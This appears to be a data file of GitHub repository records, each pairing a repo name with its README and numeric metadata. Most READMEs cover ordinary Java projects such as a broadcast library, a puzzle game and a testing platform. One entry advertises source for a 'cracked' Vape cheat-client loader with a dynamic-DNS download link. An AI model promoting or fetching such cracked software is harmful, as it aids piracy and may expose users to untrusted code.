![luminol-mc-logo.png](./luminol-mc-logo.png)

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=LegacyLands/legacy-lands-library&type=Date)](https://star-history.com/#LegacyLands/legacy-lands-library&Date)
",0,0,1,MIT,2,3.0,1.0,2.0,1.0,19.0,0.0,-4.95,0.0
MikhailSterkhov/broadcast-engine,main,"<div align=""center"">
  <img src="".assets/broadcast.png"" alt=""broadcast"" width=""250""/>
  <br>
  <img src=""https://img.shields.io/badge/language-Java-magenta?style=flat"" />
  <img src=""https://img.shields.io/badge/release-v1.0.4-magenta?style=flat"" />
  <img src=""https://img.shields.io/badge/repository-jitpack.io-magenta?style=flat"" />
  <img src=""https://img.shields.io/badge/license-MIT-magenta?style=flat"" />
</div>

# OVERVIEW

The library provides a set of tools for convenient realization of 
the system of sending messages between users of bots for social networks 
and not only.

---

The library provides a set of technologies to handle the 
dissemination of information across various integration services, 
with the ability to retrieve source records relative to which 
information is sent.

Records can be local imutable collections and other caches, 
as well as values from SQL database, the process of receiving 
can be asynchronous, split into parallel chunks, or just 
synchronously with the main thread.

---

# API

Examples of interaction with the API can be viewed in full 
in the `examples` module in the source code under the `src/main/java` 
directory.

Here I will try to tell a little more specifically what happens 
and how to use it on the examples that are implemented in the 
`examples` module

---

To begin with, it is worth understanding that the whole process 
happens with the main component of the library - `BroadcastEngine` - 
let's consider its initialization on the following example:

```java
private static final String[] NAMES = {""Flora"", ""John"", ""Mark"", ""Andrey""};

private static final RecordsMap<Integer, String> IMMUTABLE_RECORDS =
        RecordsMap.<Integer, String>builderHashMap()
                .putStream(Arrays.asList(10, 20, 30, 40), idNumber -> NAMES[(idNumber / 10) - 1])
                .build();

public BroadcastEngine createEngine() {
    AnnouncementExtractor<StringAnnouncement> announcementExtractor =
            AnnouncementExtractor.fromID(Integer.class, (id) -> new StringAnnouncement(String.format(""[ID: %s] -> \""Hello world!\"""", id)));

    BroadcastPipeline<Integer, StringAnnouncement> broadcastPipeline = BroadcastPipeline.createPipeline(Integer.class, StringAnnouncement.class)
            .setDispatcher(BroadcastDispatcher.stdout())
            .setRecordExtractor(RecordExtractor.constant(IMMUTABLE_RECORDS.toRecordsSet()))
            .setAnnouncementExtractor(announcementExtractor)
            .setScheduler(Scheduler.threadScheduler(2)); // optional
    
    return new BroadcastEngine(broadcastPipeline);
}
```

So, let's try to understand this code in detail:

The first thing we do is to create `Records` - they are needed to 
identify fields/people/entities, regarding which some information will 
be distributed. For example - it can be a Telegram user who 
has `ChatID (Long)` and `Username (String)`, which in total gives us 
a record of the following type: Record<Long, String>, which further 
goes to all other distribution services of the library for processing, 
sending and creating notifications.

Next, we create and populate the `BroadcastPipeline`. It serves to 
initialize and identify distribution systems such as `Dispatcher`, 
`Record-Extractor`, `Message-Preparing`, `Scheduler` and `event listeners`, 
which have different implementations in the abstraction.

---

To send an alert at the current moment, we can use:

```java
BroadcastEngine broadcastEngine = createEngine();
broadcastEngine.broadcastNow();
```

To schedule a cyclic sending of an alert once at some 
time generating it, we can use:

```java
BroadcastEngine broadcastEngine = createEngine();
broadcastEngine.scheduleBroadcastEverytime(Duration.ofDays(1));
```

---

# WRAPPERS & FEATURES

The library also provides a set of its own pre-packaged tools 
to facilitate the realization of common business tasks

| Name            | Artifact ID   | Version | API Usage                                                                                          |
|-----------------|---------------|---------|----------------------------------------------------------------------------------------------------|
| Hibernate       | `hibernate`   | 1.0.4   | [View code examples](examples/src/main/java/io/broadcast/example/HibernateBroadcastExample.java)   |
| Spring Data     | `spring-data` | 1.0.4   | [View code examples](examples/src/main/java/io/broadcast/example/SpringDataBroadcastExample.java)  |
| Telegram Bots   | `telegram`    | 1.0.4   | [View code examples](examples/src/main/java/io/broadcast/example/TelegramBotBroadcastExample.java) |
| Redis (jedis)   | `redis`       | 1.0.4   | [View code examples](examples/src/main/java/io/broadcast/example/JedisBroadcastExample.java)       |
| Spigot (Bukkit) | `spigot`      | 1.0.4   | [View code examples](examples/src/main/java/io/broadcast/example/SpigotBroadcastExample.java)      |
| java.sql        | `jdbc`        | 1.0.4   | [View code examples](examples/src/main/java/io/broadcast/example/JdbcH2BroadcastExample.java)      |
| javax.mail      | `smtp`        | 1.0.4   | [View code examples](examples/src/main/java/io/broadcast/example/SMTPBroadcastExample.java)        |

To use one of the components specified in the table in your project, 
simply implement the dependency as follows, where `[Artifact-ID]` 
is the dependency identifier from the `Artifact ID` table column:

**Maven:**

```xml
<dependency>
    <groupId>com.github.MikhailSterkhov</groupId>
    <artifactId>social-broadcast-[Artifact-ID]</artifactId>
    <version>[Version]</version>
</dependency>
```

**Gradle / Groovy:**

```groovy
implementation 'con.github.MikhailSterkhov:social-broadcast-[Artifact-ID]:[Version]'
```

---

# IMPORT TO PROJECT

You can install the dependency in your project using any build automation system, 
since the library is uploaded to the public jitpack.io repository, 
you just need to provide a link to it and the correct attributes 
of the dependency itself, depending on the type of build automation system:

**Maven:**

Repository:

```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```

Dependency:

```xml
<dependency>
    <groupId>com.github.MikhailSterkhov</groupId>
    <artifactId>social-broadcast-engine</artifactId>
    <version>1.0.4</version>
</dependency>
```

**Gradle / Groovy:**

Repository:

```groovy
repositories {
    mavenCentral()
    maven { url 'https://jitpack.io' }
}
```

Dependency:

```groovy
implementation 'con.github.MikhailSterkhov:social-broadcast-engine:1.0.4'
```
",5,0,8,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
hoangsonww/Akari-Puzzle-Game-JavaFX,master,"# The Akari Puzzle Game in JavaFX

Welcome to **The Akari Puzzle Game**, a JavaFX-based implementation of the classic logic puzzle ""Akari"" (also known as ""Light Up""). This game challenges you to place lamps strategically on a grid to illuminate corridors while adhering to specific rules. With a sleek user interface and a collection of puzzles ranging in difficulty, this game offers hours of brain-teasing fun!

## Table of Contents

- [Overview](#overview)
- [User Interface](#user-interface)
  - [Welcome Screen](#welcome-screen)
  - [Game Screen](#game-screen)
  - [Instructions Screen](#instructions-screen)
  - [Puzzle Solved](#puzzle-solved)
  - [Hints](#hints)
  - [Demo GIF](#demo-gif)
- [Features](#features)
- [Game Rules](#game-rules)
- [Controls](#controls)
- [Scenes](#scenes)
- [How to Play](#how-to-play)
- [Puzzle Library](#puzzle-library)
- [Technical Details](#technical-details)
- [How to Run](#how-to-run)
- [Development](#development)
- [Credits](#credits)
- [License](#license)

## Overview

The Akari Puzzle Game is a single-player logic puzzle where the objective is to place lamps on a grid to light up all corridors without violating specific rules. The game features a variety of puzzles with different sizes and difficulties, providing a challenging and engaging experience for players. The user interface is designed to be intuitive and visually appealing, with interactive controls and dynamic feedback to guide players through the puzzles.

The game follows the **Model-View-Controller (MVC)** architecture, with separate classes for managing the game state, rendering the user interface, and handling user input. The game logic ensures that puzzles are solved correctly according to the rules of Akari, providing a satisfying experience for players of all skill levels.

## User Interface

### Welcome Screen

<p align=""center"">
  <img src=""img/welcome.png"" alt=""Welcome Screen"" width=""100%"" style=""border-radius: 8px;"">
</p>

### Game Screen

<p align=""center"">
  <img src=""img/game.png"" alt=""Game Screen"" width=""100%"" style=""border-radius: 8px;"">
</p>

### Instructions Screen

<p align=""center"">
  <img src=""img/instructions.png"" alt=""Instructions Screen"" width=""100%"" style=""border-radius: 8px;"">
</p>

### Puzzle Solved

<p align=""center"">
  <img src=""img/solved.png"" alt=""Puzzle Solved"" width=""100%"" style=""border-radius: 8px;"">
</p>

### Hints

<p align=""center"">
  <img src=""img/hint.png"" alt=""Hint System"" width=""100%"" style=""border-radius: 8px;"">
</p>

### Demo GIF

<p align=""center"">
  <img src=""img/demo.gif"" alt=""Demo GIF"" width=""100%"">
</p>

## Features

- **Intuitive Interface**: Navigate through puzzles with a user-friendly design.
- **Puzzle Library**: Includes a variety of puzzles ranging from easy to challenging.
- **Interactive Controls**: Navigate between puzzles, reset your progress, and get hints.
- **Dynamic Feedback**: Visual indicators for lit cells, clue satisfaction, and illegal lamps.
- **Game State Validation**: Ensures puzzles are solved correctly according to Akari rules.
- **Hints System**: Provides guidance to help you solve difficult puzzles.

## Game Rules

1. Place lamps on empty cells (`CORRIDOR`) to light up the entire grid.
2. A lamp illuminates all cells in its row and column until blocked by a wall or clue.
3. Clues (numbered cells) indicate the exact number of adjacent lamps.
4. No two lamps can illuminate each other (i.e., no two lamps can be in the same row or column unless separated by a wall).
5. The puzzle is solved when:
  - All corridors are lit.
  - All clues are satisfied.
  - No illegal lamps exist.

## Controls

### Buttons

- **Start Game**: Begin solving puzzles.
- **Instructions**: Learn the rules and mechanics of the game.
- **Exit**: Exit the application.
- **Next Puzzle**: Load the next puzzle in the library.
- **Previous Puzzle**: Return to the previous puzzle.
- **Random Puzzle**: Load a randomly selected puzzle.
- **Reset Puzzle**: Reset the current puzzle to its initial state.
- **Hint**: Get a hint to guide your progress.

### Mouse Interactions

- **Left-Click** on a `CORRIDOR` cell to place a lamp or remove an existing lamp.

## Scenes

### Welcome Scene

The first screen the user sees:
- Provides options to start the game, view instructions, or exit.
- Features a sleek design with a title and styled buttons.

### Game Scene

The main gameplay interface:
- Displays the puzzle grid, control buttons, and puzzle information.
- Highlights cells lit by lamps and provides real-time feedback on clue satisfaction.

### Instructions Scene

Provides detailed guidance on how to play:
- Explains the rules and controls.
- Accessible at any time during gameplay.

## How to Play

1. **Start the Game**: Launch the application and click ""Start Game"" on the welcome screen.
2. **Select a Puzzle**: Use the control buttons to navigate between puzzles. Use `Random Puzzle` to load a random challenge.
3. **Place Lamps**: Click on empty corridor cells to place lamps and illuminate the grid.
4. **Check Clues**: Ensure all clue cells are satisfied with the correct number of adjacent lamps.
5. **Solve the Puzzle**: Once all cells are lit, all clues are satisfied, and no illegal lamps exist, the puzzle is solved!
6. **Next Challenge**: Advance to the next puzzle or try a random one.
7. **Get Hints**: Use the hint button to receive guidance on difficult puzzles.
8. **Enjoy the Game**: Have fun solving puzzles and challenging your logical thinking!

## Puzzle Library

The game includes 25 preloaded puzzles ranging in size and difficulty. Each puzzle is carefully designed to challenge your logical thinking. More puzzles can be added via the `SamplePuzzles` class.

## Technical Details

### Architecture

- **Model-View-Controller (MVC)**: Ensures clean separation of concerns.
  - **Model**: Manages the state of the game, including the active puzzle and its properties.
  - **View**: Renders the user interface, including the puzzle grid and controls.
  - **Controller**: Handles user input and updates the model and view accordingly.

### Key Classes

- `AppLauncher`: The entry point of the application, manages scenes and stage.
- `ControllerImpl`: Implements the game logic and updates the model based on user input.
- `ModelImpl`: Represents the game state and validates puzzle conditions.
- `PuzzleView`, `ControlView`, `MessageView`: Render the puzzle grid, control buttons, and dynamic messages.
- `SamplePuzzles`: Contains preloaded puzzles for the game.
- `Main`: Contains the main method to launch the application.

### Key Interfaces

- `AlternateMvcController`: Defines the methods for handling user input and updating the game state.
- `ClassicMvcController`: Extends `AlternateMvcController` and adds methods for managing the game state.
- `Model`: Defines the methods for managing the game state and validating puzzle conditions.
- `Puzzle`: Represents a single puzzle with a grid, clues, and solution.
- `PuzzleLibrary`: Contains a collection of puzzles and methods for accessing them.
- `FXComponent`: Represents a JavaFX component with methods for initializing and updating the view.

### Dependencies

- **Java 17+**: Core programming language for the application.
- **JavaFX**: Used for the user interface and event handling.
- **JUnit 4**: For unit testing the model and controller logic.
- **Mockito**: For mocking dependencies during testing.

## How to Run

### Prerequisites

- Java Development Kit (JDK) version 17 or later.
- Maven for dependency management (optional).

### Steps
1. Clone the repository:
   ```bash
   git clone https://github.com/hoangsonww/Akari-Puzzle-Game-JavaFX.git
   ```
2. Navigate to the project directory:
   ```bash
   cd Akari-Puzzle-Game-JavaFX
   ```
3. Build and run the project:
   ```bash
   mvn javafx:run
   ```
   Alternatively, you can run the `AppLauncher` class directly from your IDE, if you are using IDEs like IntelliJ IDEA or Eclipse and have JavaFX configured.

## Development

### Adding New Puzzles

1. Open the `SamplePuzzles` class.
2. Add a new 2D integer array representing the puzzle grid.
3. Register the new puzzle in the `PuzzleLibrary` within `AppLauncher`.

### Styling

- Modify the `main.css` file to customize the appearance of the application.
- Use of CSS styles to change colors, fonts, and layout properties.

### Unit Testing
- Run the JUnit 4 test suite to validate the functionality:
  ```bash
  mvn test
  ```
- Test cases cover model logic, controller actions, and game state validation.
- Alternative: Run individual test classes directly from your IDE.

## Credits

- **Developer**: [Son Nguyen](https://github.com/hoangsonww)
- **Icon**: [Freepik](https://www.flaticon.com/authors/freepik) via Flaticon.
- **Puzzle Design**: Inspired by the classic logic puzzle ""Akari"" (Light Up).

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.

---

Created with ‚ù§Ô∏è by [Son Nguyen](https://github.com/hoangsonww) in 2024.
",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,27.0
xcancloud/AngusTester,main,"AngusTester
===

- [English Version](README.md)
- [‰∏≠ÊñáÁâà](README_zh.md)

## Introduction

**[AngusTester](https://www.xcan.cloud)** (referred to as `AT`) is designed to assist software development teams in efficiently and sustainably carrying out software development and testing activities, while fulfilling the agile development and testing requirements of users.

Core functions include software project management, functional testing, API testing, scenario testing, service mock, data mock, reporting, and analysis.

Target users consist of product owners, testers, developers, operations personnel, and managers.

For a detailed introduction to the AngusTester application, please see the: [Product Documentation](https://www.xcan.cloud/help/doc/205509853639082016?c=205515800021303296).

## Architecture

The [AngusTester](https://www.xcan.cloud) system architecture diagram illustrates the relationships among the main applications, services, components, and data flow. This diagram provides a comprehensive overview of how AngusTester can be deployed rapidly and effectively.

![SystemArchitecture](https://bj-c1-prod-files.xcan.cloud/storage/pubapi/v1/file/SystemArchitecture-en.png?fid=251751417168003559&fpt=S5cEQknNVBFrBYoXMwJeYrku0NECgaq5LLy0JDJ0)

## Features

- **Agile Development**: Supports Scrum agile management, ensuring flexibility in development and
  testing, capable of rapidly responding to changes.
- **Comprehensive Collaboration**: All activities are tasks, supporting follow-up and management of
  development and testing activities such as requirements, stories, tasks, bugs (defects), interface
  testing, scenario testing, and functional testing.
- **High Performance**: Extremely high testing performance, with an overall performance improvement
  of over 30% compared to JMeter, capable of handling millions of concurrent connections and tens of
  millions of QPS performance scenarios for protocols such as Http and WebSocket.
- **Distributed**: In addition to single-machine testing, supports distributed environments and
  testing with hundreds of pressure testing nodes across different geographical regions.
- **Automation**: Can automatically generate test cases and scripts, as well as corresponding
  execution configurations based on test objectives and focus points.
- **Intelligence**: Allows querying knowledge bases, writing test cases, and scripts through AI
  intelligent assistant text interaction, simplifying workflows and improving work efficiency.
- **Plugin-based**: Greatly improves the customizability, extensibility, and maintainability of
  applications, allowing users to install and update plugins without upgrading the main application.
- **Specification-based Testing**: Unlike writing scripts in Python and C, AngusTester uses YAML and
  JSON text specifications to define scripts, making manual script writing simpler.
- **Scenario Design**: Compared to single-step testing, scenarios contain more steps and processes;
  additionally, users can replace manual script writing with the scenario design interface.
- **API Asset Management**: Treats backend development API results as important assets, and
  effectively manages and maintains them, such as online editing, debugging, and documenting
  interfaces.
- **Multi-platform Apis Import**: Supports import of multiple data formats including Swagger2.0,
  OpenAPI3.x, Postman2.0, Postman2.1, as well as custom import extensions.
- **Service Mock**: Quickly generates and simulates the APIs you depend on, enabling development and
  testing to proceed first, achieving faster development and more comprehensive testing; also avoids
  dirty data issues caused by direct integration with production systems.
- **Data Mock**: Supports rich data simulation functions, generating more realistic data compared to
  random data for system testing, service simulation, project demonstrations, and other scenarios.
- **Metric Management**: Supports setting of business performance metrics and test metrics (
  functional testing, performance testing, stability testing).
- **KPI-oriented Assessment**: Supports statistical analysis of performance indicators such as
  number of tasks, workload, overdue rate, first-time pass rate, and first-time review pass rate.
- **Service Sharing**: Multi-tenant support, providing comprehensive RestFul style APIs for easy
  integration with other CI systems or development systems.
- **Achievement Sharing**: Maximizes sharing of scripts, parameterized files, scenario designs,
  interfaces, reports, etc., among team members.
- **Professional Reporting**: Supports 16 types of business template settings and report generation
  for projects, functional testing, interface testing, scenario testing, task execution, etc.
- **Extended Identity Management Support**: In addition to built-in identity management, extends
  support for LDAP/Active Directory services and OAuth2 user single sign-on authentication.
- **Security**: Supports Https secure transmission protocol, data-level permission control, and
  policy-based access control (PBAC) permission schemes.

## Agile Process

- Agile Development

**Continuously improve the product through iterative and incremental delivery.** The development team breaks the project into smaller, manageable parts called ‚Äúiterations.‚Äù Each iteration typically lasts a few weeks, during which the team completes a set amount of work and delivers a usable product increment at the end.

In each iteration, **the team adjusts and improves based on feedback from customers and stakeholders.** This flexibility allows the development team to respond promptly to changes in user demands, ensuring the final product better aligns with user expectations. Through regular reviews and feedback loops, the team can identify issues, optimize processes, and implement improvements in subsequent iterations, thereby continuously enhancing product quality and user satisfaction.

![AgileDevelopment](https://bj-c1-prod-files.xcan.cloud/storage/pubapi/v1/file/AgileDevelopment-en.png?fid=251751417168003547&fpt=cJtrXcKqHDinifAVloooQO5UMYQtbm1xiMseeUp0)

- Agile Testing

**Software testing in an agile development environment emphasizes close collaboration between testing and development.** In agile development, testing is not a separate phase but occurs concurrently with development activities. This approach ensures that testers can engage early in the development process, allowing for earlier identification and resolution of issues.

**Through continuous feedback and collaboration, the testing team works closely with the development team to identify potential defects and risks.** This collaboration involves not only the design and execution of test cases but also understanding user stories and requirements. The goal of agile testing is to improve software quality, ensuring that it meets high standards in each iteration and fulfills user needs.

![AgileTesting](https://bj-c1-prod-files.xcan.cloud/storage/pubapi/v1/file/AgileTesting-en.png?fid=251751417168003551&fpt=iFgOChd9HoRhB8OKkQwMDr0m4BAXnZsBA1Dq7gFY)

## Plugins Support

AngusTester's plugin-based implementation supports the following plugins:

- Functional Plugins

    - Functional Testing ‚àö
    - Security Testing
    - Event Notification - Huawei Cloud SMS ‚àö
    - Event Notification - Alibaba Cloud SMS ‚àö
    - Api Signature

- Protocol Testing Plugins

    - Http(s)      ‚àö
    - WebSocket(s) ‚àö
    - JDBC ‚àö
    - TCP ‚àö
    - FTP ‚àö
    - LDAP ‚àö
    - SMTP ‚àö
    - MAIL(POP3/IMAP) ‚àö
    - JMS ‚àö
    - Dubbo
    - gRPC

- Middleware Testing Plugins

    - Databases: MySQL ‚àö, SQLServer ‚àö, Postgresql ‚àö, Oracle ‚àö
    - Cache Services: Redis, Memcached
    - NoSQL: MongoDB ‚àö, ClickHouse, HBase, Cassandra, TSDB, InfluxDB
    - Message Queues: Kafka ‚àö, RabbitMQ ‚àö, ZeroMQ, RocketMQ

- Mock Data Plugins

    - MockCsv ‚àö
    - MockExcel ‚àö
    - MockJson ‚àö
    - MockSql ‚àö
    - MockTab ‚àö
    - MockXml ‚àö
    - MockCustom ‚àö

## Develop Technology

**AngusTester** application is developed using a modern architecture with a separation of frontend and backend technologies. This separation design significantly enhances the application's flexibility, scalability, and maintainability.

The current project serves as the backend for AngusTester, primarily providing **RESTful API** services. The main features of the backend include:

- **RESTful API Design**: The APIs adhere to REST principles, being stateless and operating through standard HTTP methods such as GET, POST, PUT, PATCH, and DELETE. This ensures easy integration with various frontend technologies and platforms.
- **Scalability**: The separation of frontend and backend allows each component to scale independently based on user demand and system load, improving overall system performance.
- **Maintainability**: By adopting a modular approach, developers can update or modify a specific part of the application without affecting others, thereby simplifying ongoing maintenance and feature enhancements.

For detailed information about the frontend project and its technology stack, please refer to the **[AngusTesterWeb](https://github.com/xcancloud/AngusTesterWeb.git)** documentation. The frontend aims to provide a user-friendly interface that interacts seamlessly with the backend APIs.

Below is the main technology stack for the AngusTester project:

| Category           | Technology Name                           | Description                                               |
|--------------------|------------------------------------------|-----------------------------------------------------------|
| Programming Language | OpenJDK 11+                              | Provides a stable and open Java runtime environment with rich library support. |
| Enterprise Framework | Spring Boot 2.4.3                        | Simplifies the development process and supports rapid building and deployment. |
| SaaS Development Framework | XCanSDF 1.0.0                          | Helps developers quickly implement Software as a Service (SaaS) functionalities. |
| Database           | MySQL(‚àö), PostgreSQL(‚úó)                     | Major relational databases that support data storage and management. |
| Database Persistence | JPA (Java Persistence API)               | Provides a persistence layer for database operations, making data access simpler and more efficient. |
| Caching Middleware  | Redis                                    | Enhances system performance and reduces database load.    |
| Caching Implementation | Lettuce                                  | An asynchronous and reactive client for Redis, suitable for high-throughput scenarios. |
| Full-text Search   | MySQL Fulltext Index(‚àö), Elasticsearch(‚úó)   | Supports efficient full-text search functionality to meet users' information retrieval needs. |
| Project Build Tool | Maven 3+                                 | Project management and build tool responsible for dependency management and project packaging. |

Here‚Äôs the translation of your text into English, while keeping the Markdown format:

## Deployment Installation

The following is a list of applications and services for AngusTester. For the specific installation process, please refer to the: [AngusTester Installation](https://www.xcan.cloud/help/doc/205509853639082016?c=209786779925032562):

| Application/Service   | Installation Package                                 | Default Port | Description                                                                                                   |
|-----------------------|----------------------------------------------------|--------------|---------------------------------------------------------------------------------------------------------------|
| AngusInstaller         | [AngusInstaller-Community-1.0.0.zip](https://xcan-angustester.oss-cn-beijing.aliyuncs.com/AngusPackage/AngusInstaller-Community-1.0.0.zip) | 8800         | Application installer, providing a web interface for installing and configuring applications and services.     |
| AngusDiscovery         | [AngusCtrl-Community-1.0.0.zip](https://xcan-angustester.oss-cn-beijing.aliyuncs.com/AngusPackage/AngusDiscovery-Community-1.0.0.zip)      | 8801         | Registry service for service registration, discovery, management, and ensuring load balancing and failover. `Automatically installed when installing AngusGM`.   |
| AngusGM                | [AngusGM-Community-1.0.0.zip](https://xcan-angustester.oss-cn-beijing.aliyuncs.com/AngusPackage/AngusGM-Community-1.0.0.zip)        | 8802, 8803   | Global management application, a unified system resource management platform for ""system administrators"" to manage and control the entire system, organization, or application. |
| AngusTester            | [AngusTester-Community-1.0.0.zip](https://xcan-angustester.oss-cn-beijing.aliyuncs.com/AngusPackage/AngusTester-Community-1.0.0.zip)    | 8901         | Agile development and testing business applications, main features include task collaboration, functional testing, API assetization, scenario testing, service simulation, and data simulation. |
| AngusCtrl              | [AngusCtrl-Community-1.0.0.zip](https://xcan-angustester.oss-cn-beijing.aliyuncs.com/AngusPackage/AngusCtrl-Community-1.0.0.zip)      | 8902         | Controller service for task control, scheduling, monitoring, metrics, and analysis.                           |
| AngusAgent             | [AngusAgent-1.0.0.zip](https://bj-c1-prod-files.xcan.cloud/storage/pubapi/v1/file/AngusAgent-Full-1.0.0.zip?fid=248565189237014528)               | 6807         | Node agent service for executing script tasks, running and managing Mock services on agent nodes, collecting, monitoring, and reporting various metrics and performance data about the nodes. |
| AngusProxy             | [AngusProxy-1.0.0.zip](https://bj-c1-prod-files.xcan.cloud/storage/pubapi/v1/file/AngusProxy-1.0.0.zip?fid=248565111927603200)               | 6806         | Request proxy service for proxying HTTP and WebSocket protocol interface debugging requests, solving browser cross-origin restriction issues. |
| AngusMockService       | [AngusMockService-1.0.0.zip](https://bj-c1-prod-files.xcan.cloud/storage/pubapi/v1/file/AngusMockService-1.0.0.zip?fid=248565111927603206)         | 30010        | Mock service that provides a virtual environment to simulate different interface responses, status codes, and data, allowing you to quickly generate and mock the APIs you rely on. |
| AngusRunner            | [AngusRunner-1.0.0.zip](https://bj-c1-prod-files.xcan.cloud/storage/pubapi/v1/file/AngusRunner-1.0.0.zip?fid=248565111927603202) | /            | Command-line tool and executor that executes running tests and simulated data tasks sent to the agent program (AngusAgent) by AngusCtrl and sends the test results back to the server. `Automatically installed when installing the complete packages of AngusTester and AngusAgent`. |

## Contribute Code

GitHub Contributor's Guide for Clone, Configure, and Run AngusTester Project This guide will walk you
through the process of contributing to AngusTester project hosted on GitHub.

### 1. Clone the Project

1. Go to the [GitHub](https://github.com/xcancloud/AngusTester.git) project page.
2. Click the ""Code"" button and copy the HTTPS or SSH URL.
3. Open your terminal and navigate to your desired directory.
4. Run:
   ```bash
   git clone https://github.com/xcancloud/AngusTester.git
   ```
5. Enter the project directory:
   ```bash
   cd AngusTester
   ```

### 2. Set Up Maven

1. Ensure Maven is installed. Check by running:
   ```bash
   mvn -version
   ```
2. If not installed, download and install Maven from the official website.
3. Add the following configuration to the settings.xml file:
   ```xml
    <mirror>
      <id>xcan-maven-public</id>
      <mirrorOf>*</mirrorOf>
      <name>xcan public</name>
      <url>http://nexus.xcan.work/repository/xcan-maven-public/</url>
    </mirror>
   ```

### 3. Configure and Build the Project

1. Open `pom.xml` in the project root to review dependencies.
2. Build the project and download dependencies:
   ```bash
   mvn clean install
   ```

### 4. Run the SpringBoot Application

1. In the project root, run:
   ```bash
   mvn spring-boot:run
   ```
   **Note: It is necessary to ensure that the AngusDiscovery service registry is running.**
2. Wait for the ""Started Application"" message.
3. Open a web browser and go to `http://localhost:1830/swagger-ui/` to verify.

### 5. Make Changes and Contribute

1. Create a new branch:
   ```
   git checkout -b dev/your-feature-name
   ```
2. Make your code changes.
3. Commit your changes:
   ```bash
   git add .
   git commit -m ""Describe your changes""
   ```
4. Push to GitHub:
   ```bash
   git push origin dev/your-feature-name
   ```
5. Go to the GitHub project page and create a Pull Request.

## Feedback

Please send your feedback email to: `feedback@xcan.cloud`.

Online ticket feedback address: [https://www.xcan.cloud/support](https://www.xcan.cloud/support)

Thank you again for your support! We especially appreciate your sharing and forwarding.

Sincerely grateful!

The AngusTester Team!
",0,0,1,GPL-3.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,4.0
Peharge/learn-java,main,"<p align=""center"">
    <img src=""./readme-img/java-logo-3.png"" width=""250""/>
</p>
<br>
<div align=""center"">

<img alt=""Learn Java"" src=""https://img.shields.io/badge/Learn Java-blue"">
<img alt=""Peharge"" src=""https://img.shields.io/badge/Peharge-blue"">
<br>
<br>

<img alt=""java"" src=""https://img.shields.io/badge/-Java-blue?logo=openjdk"">
<img alt=""Clion"" src=""https://img.shields.io/badge/-IntelliJ-orange?logo=intellij-idea"">
<br>
<br>

<img alt=""os"" src=""https://img.shields.io/badge/os-linux%20%7C%20macOS%20%7C%20windows-blue"">
<br>
<br>

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
<br>

</div>

# _Learn Java_

> All you need is Java and you can read that here.

This repository contains a collection of Java code samples on various topics. Here you will find examples of basic to advanced Java concepts.

### Installation

1. **Clone repository**<br>
   Clone the repository to a local directory:
    ```bash
    git clone https://github.com/Peharge/learn-java
    ```
2. **Change directory**<br>
   Navigate to the project directory:
    ```bash
    cd learn-java
    ```

3. **Have fun**",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Spec-JohnXina/Vape-v4.16,main,"Source code of [Vape v4.16 cracked loader](http://johnspecial.ydns.eu/vape4.16), for reference only

if you are interested in implementing the unfinished parts (config, irc etc) feel free to create pull request or issue
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
ali-bouali/game-store-application,main,"This a basic readme file.
We will update it later
",0,0,1,Apache-2.0,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Kalpu-24/SnakeWall,main,"# Snake Game as Live Wallpaper

## Download
<p align=""left"">
  <a href=""https://play.google.com/store/apps/details?id=kalp.snake.wall"">
    <img src=""https://github.com/user-attachments/assets/6f83f1aa-6f1a-4538-90fe-69f7692ec465"" alt=""Get it on Google Play"" height=""60"" />
  </a>
  <a href=""https://github.com/Kalpu-24/SnakeWall/releases/latest"">
    <img src=""https://github.com/user-attachments/assets/a0b0cde0-48e0-47ca-a2b3-721d3b2f3dc6"" alt=""Get it on GitHub"" height=""60"" />
  </a>
</p>

## Demo

<https://github.com/user-attachments/assets/5d82f9e8-1699-40a3-94be-1e8748fce9ca>

## What it does

- Set it as Live Wallpaper and play snake game.
- A singular button to start/pause/resumme/restart game.
- Four control buttons to move snake.
- Every 3 food hits increases snake speed.
- Handles screen off, no action for 10 seconds and no visibilty events gracefully.

## Future Plans

- [x] Start screen bug fix
- [x] App icon
- [x] Color Presets settings
- [x] Grid Toggle
- [x] Auto change color
- [ ] Set Image as background
- [ ] Dynamic color for image based background
- [ ] Custom color preference settings
- [ ] Control buttons positioning setting
- [x] Publish on Playstore
",1,2,2,MIT,2,13.0,1.0,2.0,1.0,14.0,0.0,-3.7,2.0
bowbahdoe/jdk-httpserver-realworld,main,"# ![RealWorld Example App](logo.png)

> ### JDK HTTP Server codebase containing real world examples (CRUD, auth, advanced patterns, etc) that adheres to the [RealWorld](https://github.com/gothinkster/realworld) spec and API.

This codebase was created to demonstrate a fully fledged fullstack application built with the JDK HTTP Server including CRUD operations, authentication, routing, pagination, and more.

For more information on how to this works with other frontends/backends, head over to the [RealWorld](https://github.com/gothinkster/realworld) repo.

This is deployed [here](https://jdk-httpserver-realworld.onrender.com/)

# How it works

This is built up of a few components. Primarily

* The [`jdk.httpserver`](https://docs.oracle.com/en/java/javase/22/docs/api/jdk.httpserver/module-summary.html) module which provides the API that is programmed against
* [Jetty](https://github.com/jetty/jetty.project) which provides the actual backing implementation for `jdk.httpserver`
* [Postgresql](https://postgresql.org) for the database
* [RainbowGum](https://github.com/jstachio/rainbowgum) for logging

Then, serving specific tasks:

* [dev.mccue.jdk.httpserver](https://github.com/bowbahdoe/jdk-httpserver) for providing a `Body` abstraction
* [dev.mccue.jdk.httpserver.regexrouter](https://github.com/bowbahdoe/jdk-httpserver-regexrouter) for basic request routing
* [dev.mccue.json](https://github.com/bowbahdoe/json) for reading and writing JSON
* [dev.mccue.jdk.httpserver.json](https://github.com/bowbahdoe/jdk-httpserver-json) for using JSON as a `Body` and reading it from `HttpExchange`s
* [dev.mccue.urlparameters](https://github.com/bowbahdoe/urlparameters) for parsing query params
* [dev.mccue.jdbc](https://github.com/bowbahdoe/jdbc) for `UncheckedSQLException` and `SQLFragment`
* [io.github.cdimascio.dotenv.java](https://github.com/cdimascio/dotenv-java) for local development `.env` files
* [slugify](https://github.com/slugify/slugify) for turning text into a url sage slug
